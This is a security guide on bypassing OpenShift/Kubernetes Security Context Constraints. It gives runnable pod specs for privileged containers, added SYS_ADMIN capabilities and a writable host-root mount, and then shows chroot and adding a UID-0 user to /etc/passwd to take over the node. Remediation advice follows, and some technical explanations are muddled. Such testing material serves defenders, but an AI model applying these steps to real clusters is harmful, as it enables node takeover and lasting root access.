# Kubernetes Security Context Constraint (SCC) Bypass

## 1. Overview

### Attack Vector Description

This vulnerability focuses on bypassing Kubernetes Security Context Constraints (SCCs). SCCs are Kubernetes resources that control the security attributes that pods must have in order to be accepted into the system. A bypass occurs when a pod can be created with security attributes that violate the intended policy enforced by the SCC. This typically involves finding loopholes in the SCC configuration, exploiting misconfigurations, or leveraging vulnerabilities in container runtimes.

Attackers aim to escalate privileges within the cluster, gain access to sensitive data, or potentially compromise the entire cluster by bypassing the intended security restrictions. This can involve executing privileged containers, mounting host paths without proper restrictions, or using capabilities that circumvent security measures.

### Potential Impact and Consequences

A successful SCC bypass can lead to severe consequences:

*   **Privilege Escalation:** Gaining root privileges within a container or on the underlying node.
*   **Data Exfiltration:** Accessing sensitive data stored in other pods, secrets, or persistent volumes.
*   **Cluster Takeover:** Compromising the entire Kubernetes cluster by exploiting privileged access.
*   **Denial of Service:** Disrupting cluster operations by deploying malicious pods.
*   **Lateral Movement:** Moving from one container or node to another within the cluster.

### Risk Level Assessment

**Critical/High**

The risk level is generally considered **Critical** or **High** because a successful bypass can allow an attacker to gain significant control over the cluster, leading to substantial damage.

### Technical Explanation

The vulnerability exists due to several factors:

*   **Misconfigured SCCs:** SCCs that are too permissive or lack sufficient restrictions.  For example, an SCC allowing `privileged: true` without proper RBAC controls.
*   **Bypassable Features:** Certain features within containers, such as `hostPath` volumes or Linux capabilities, can be exploited to circumvent security measures if not properly restricted in the SCC.
*   **Container Runtime Vulnerabilities:** Bugs in the container runtime can be leveraged to bypass SCC restrictions.
*   **Lack of Monitoring and Auditing:** Insufficient logging and monitoring of pod creation events and SCC violations.
*   **Pod Security Admission misconfigurations:** Pod Security Admission is a gatekeeper to prevent SCC bypasses. If not configured properly, it might let vulnerable pods be created.

### Prerequisites and Conditions Needed

*   **Access to the Kubernetes API:**  The attacker needs to be able to create or modify pod specifications. This typically requires RBAC permissions to create pods in a specific namespace.
*   **Knowledge of the Cluster Configuration:** Understanding the existing SCCs, RBAC roles, and container runtime configuration can help identify potential bypass opportunities.
*   **Tools for Interacting with the Kubernetes API:** Tools like `kubectl`, `oc`, or client libraries for interacting with the Kubernetes API.
*   **A vulnerable cluster configuration:** The existence of overly permissive SCCs or an outdated Kubernetes version with known container runtime vulnerabilities.

## 2. Validation and Exploitation Steps

We will demonstrate bypassing SCCs by creating a privileged container. This approach directly modifies the pod specification to include `securityContext` that violates default SCC rules.

### Step 1: Identify Existing SCCs

```bash
kubectl get scc
```

**Explanation:**

This command lists all Security Context Constraints defined in the cluster. This helps us identify potentially permissive SCCs that might be targeted.

**Expected Output:**

A table listing all SCCs, including their names, priority, and allowed capabilities.  Look for SCCs that might be overly permissive, such as one with `privileged: true`.

**Why it's executed:**

To understand the existing security context constraints and identify potential bypass vectors based on their configurations.

### Step 2: Examine the `restricted` SCC (or similar base SCC)

```bash
kubectl get scc restricted -o yaml
```

**Explanation:**

This command retrieves the YAML definition of the `restricted` SCC (which is a common default SCC) to understand its limitations. This allows us to identify how to violate this default, typically by adding configurations that are disallowed.

**Expected Output:**

A YAML representation of the `restricted` SCC, showing the allowed capabilities, volumes, and other security-related settings.

**Why it's executed:**

To understand the default SCC and therefore to figure out how to violate it, creating a pod that exploits vulnerabilities within the security model.

### Step 3: Attempt to Create a Privileged Pod (Bypass Attempt #1: `privileged: true`)

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: privileged-container
    image: busybox:latest
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
EOF
```

**Explanation:**

This command creates a pod named `privileged-pod` with a single container that requests to run in privileged mode by setting `securityContext.privileged` to `true`.  This is a direct attempt to bypass the `restricted` SCC, which typically disallows privileged containers.

**Expected Output:**

If the default Pod Security Admission is enabled, you will likely get an error indicating that the pod violated the restricted profile. Otherwise the pod will be created, but it may immediately be blocked by the SCC. If you bypass the SCC successfully, the pod will remain in `Pending` state until the kubelet tries to start it and violates some other constraint. This can sometimes give misleading error messages, but usually includes a denial for some aspect of privilege escalation.

**Why it's executed:**

To directly test if the cluster allows privileged containers to be created, which would indicate a misconfigured SCC or Pod Security Admission.

**Alternative Approach:**

If you have limited RBAC permissions and cannot directly create pods, attempt to deploy a deployment or replicaset using similar specifications.

### Step 4:  Examine the Error and Identify the SCC Violation (If Privileged Pod Creation Fails)

If the previous command fails, examine the error message carefully to understand which SCC constraint was violated. The error message will likely mention `securityContext` or `capabilities`.

```bash
kubectl describe pod privileged-pod
```

**Explanation:**

This command retrieves detailed information about the `privileged-pod`, including events that occurred during pod creation. The events section will often contain error messages indicating why the pod failed to be scheduled or started.

**Expected Output:**

The output will include error messages, possibly indicating:

*   `"securityContext.privileged: Forbidden: disallowed by policy"`
*   `"capabilities.add: Forbidden: disallowed by policy"`

**Why it's executed:**

To diagnose why the privileged pod creation failed and to identify the specific SCC constraints that need to be bypassed.

### Step 5: Bypass Attempt #2: Using Capabilities (If `privileged: true` is Blocked)

If `privileged: true` is blocked, try bypassing the SCC by adding specific capabilities:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: capabilities-pod
spec:
  containers:
  - name: capabilities-container
    image: busybox:latest
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      capabilities:
        add: ["SYS_PTRACE", "SYS_ADMIN"]
EOF
```

**Explanation:**

This command creates a pod named `capabilities-pod` that attempts to bypass the SCC by adding the `SYS_PTRACE` and `SYS_ADMIN` capabilities.  These capabilities can allow the container to perform privileged operations.

**Expected Output:**

Similar to the previous step, the pod creation may fail, but if successful, the pod creation events might expose errors related to denied capabilities. If the pod *does* start, it may be able to leverage those elevated permissions to escape from the container.

**Why it's executed:**

To test if the SCC allows specific dangerous capabilities to be added, which can provide similar access to `privileged: true`.

**Alternative Approach:**

Experiment with different capabilities such as `NET_RAW`, `NET_ADMIN`, `DAC_OVERRIDE`, `DAC_READ_SEARCH`, and `FOWNER`.

### Step 6: Bypass Attempt #3: Host Path Mount (If Capabilities are Restricted)

If capabilities are restricted, try bypassing the SCC by mounting a host path:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-pod
spec:
  volumes:
  - name: host-volume
    hostPath:
      path: /
  containers:
  - name: hostpath-container
    image: busybox:latest
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - name: host-volume
      mountPath: /host
      readOnly: false
EOF
```

**Explanation:**

This command creates a pod named `hostpath-pod` that mounts the entire host filesystem (`/`) into the container at `/host`.  If successful, this allows the container to access and potentially modify files on the host system, circumventing container isolation.

**Expected Output:**

The pod creation might fail if the SCC restricts host path mounts. If successful, the container will have access to the host filesystem and can potentially escalate privileges.

**Why it's executed:**

To test if the SCC allows mounting host paths, which can provide direct access to the underlying node's filesystem.

### Step 7:  Exploitation:  Gain Root Access on the Host (If Host Path Mount Succeeded)

If the host path mount was successful, connect to the container and attempt to gain root access on the host:

```bash
kubectl exec -it hostpath-pod -- /bin/sh
```

Once inside the container:

```bash
chroot /host
```

This attempts to change the root directory of the container process to the host filesystem. If successful, subsequent commands will be executed as if they were running on the host.

```bash
# Add a user to the host system
echo "attacker::0:0::/root:/bin/bash" >> /etc/passwd
```

This command adds a new user named "attacker" with UID 0 (root) to the host's `/etc/passwd` file.  This allows the attacker to log in as root on the host.  **Note: This is highly destructive and should only be done in a controlled test environment!**

**Explanation:**

These commands demonstrate how to leverage a successful host path mount to gain root access on the host.  The `chroot` command effectively escapes the container's filesystem and allows the attacker to interact with the host system directly. Adding a root user is a severe escalation and illustrates the potential impact.

**Expected Output:**

Successful execution of `chroot` and the addition of the user to `/etc/passwd` (assuming appropriate permissions and filesystem structure).

**Why it's executed:**

To demonstrate the severity of a successful host path mount and how it can be used to completely compromise the underlying node.

### Step 8: Clean Up

After testing, remove the created pods and SCC if you have created a custom SCC

```bash
kubectl delete pod privileged-pod
kubectl delete pod capabilities-pod
kubectl delete pod hostpath-pod
```

**Explanation:**

This step is crucial to clean up the testing environment and prevent unintended consequences.

**Why it's executed:**

To maintain a clean and secure environment after testing.

## Remediation Recommendations

1.  **Implement Pod Security Admission (PSA):** Use PSA to enforce security policies on namespaces and prevent the creation of pods that violate these policies. PSA is the recommended approach to restrict pods from using overly permissive security context attributes.
2.  **Minimize the Use of `privileged: true`:** Avoid using `privileged: true` in SCCs and pod specifications unless absolutely necessary. If required, carefully consider the RBAC controls to limit who can use these privileged SCCs.
3.  **Restrict Capabilities:**  Carefully define the capabilities that containers need and only grant the minimum required capabilities. Avoid granting overly permissive capabilities like `SYS_ADMIN`.
4.  **Control Host Path Mounts:**  Restrict the use of host path mounts in SCCs. If required, limit the allowed host paths to specific directories and ensure that the mounted paths are read-only when possible. Consider using AppArmor or SELinux to further restrict access to the host filesystem.
5.  **Regularly Review SCCs:**  Periodically review and update SCCs to ensure they are still appropriate for the current environment and security requirements.
6.  **Enable Auditing:**  Enable Kubernetes auditing to track pod creation events and SCC violations.  This can help detect and respond to bypass attempts.
7.  **Keep Kubernetes Up-to-Date:**  Regularly update Kubernetes and the container runtime to the latest versions to patch known vulnerabilities.
8.  **Implement Network Policies:** Use network policies to restrict network communication between pods and limit the impact of a potential compromise.
9.  **Use a Security Scanner:** Use security scanners to scan your Kubernetes configurations and deployments for potential vulnerabilities and misconfigurations.
10. **Principle of Least Privilege:** Apply the principle of least privilege throughout your Kubernetes cluster. Grant users, service accounts, and containers only the minimum necessary permissions.
11. **Monitor for Anomaly Detection:** Implement anomaly detection systems that can identify suspicious activity, such as unexpected pod creation attempts or privilege escalation attempts.
